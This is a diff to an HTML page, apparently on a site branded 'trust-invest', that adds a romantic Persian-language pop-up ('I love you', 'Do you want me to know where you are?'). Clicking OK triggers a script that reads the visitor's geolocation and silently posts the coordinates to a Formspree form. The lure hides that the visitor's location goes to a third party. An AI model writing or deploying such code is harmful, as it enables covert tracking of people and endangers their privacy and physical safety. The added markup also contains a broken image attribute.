@@ -24,7 +24,86 @@
 </head>
 
 <body style="margin:0; font-family:system-ui; background:#fff; color:#111;">
+<style>
+/* Modal */
+#myModal {
+  display: none; 
+  position: fixed; 
+  z-index: 1000; 
+  left: 0;
+  top: 0;
+  width: 100%; 
+  height: 100%; 
+  overflow: auto; 
+  background-color: rgba(0,0,0,0.5); 
+}
+#modalContent {
+  background-color: #fff;
+  margin: 15% auto; 
+  padding: 20px;
+  border-radius: 10px;
+  width: 90%;
+  max-width: 400px;
+  text-align: center;
+}
+#modalContent img {
+  max-width: 100%;
+  border-radius: 10px;
+}
+#modalContent button {
+  margin-top: 15px;
+  padding: 10px 20px;
+  font-size: 16px;
+}
+</style>
 
+<!-- Modal HTML -->
+<div id="myModal">
+  <div id="modalContent">
+    <h2>دوستت دارم ❤️</h2>
+    <p>می‌خوای بدونم کجایی؟</p>
+    <img src="https://trust-invest.github.io/trustinvest/me.jpg alt="Love Image" />
+	   <link rel="icon" type="image/png" href="https://trust-invest.github.io/trustinvest/me.jpg">
+    <br>
+    <button id="okBtn">OK</button>
+  </div>
+</div>
+
+<script>
+window.onload = function() {
+  const modal = document.getElementById("myModal");
+  const okBtn = document.getElementById("okBtn");
+
+  // نمایش پاپ‌آپ
+  modal.style.display = "block";
+
+  okBtn.onclick = function() {
+    modal.style.display = "none";
+
+    // دریافت لوکیشن
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        // ارسال به فرم یا Formspree
+        fetch("https://formspree.io/f/xzdjznjn", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            message: "User visited page",
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          })
+        })
+        .then(() => console.log("Location sent"))
+        .catch(err => console.log("Error:", err));
+      }, function(error){
+        console.log("Location denied:", error.message);
+      });
+    }
+  }
+}
+</script>
 	<script>
 function getLocation() {
   if (navigator.geolocation) {
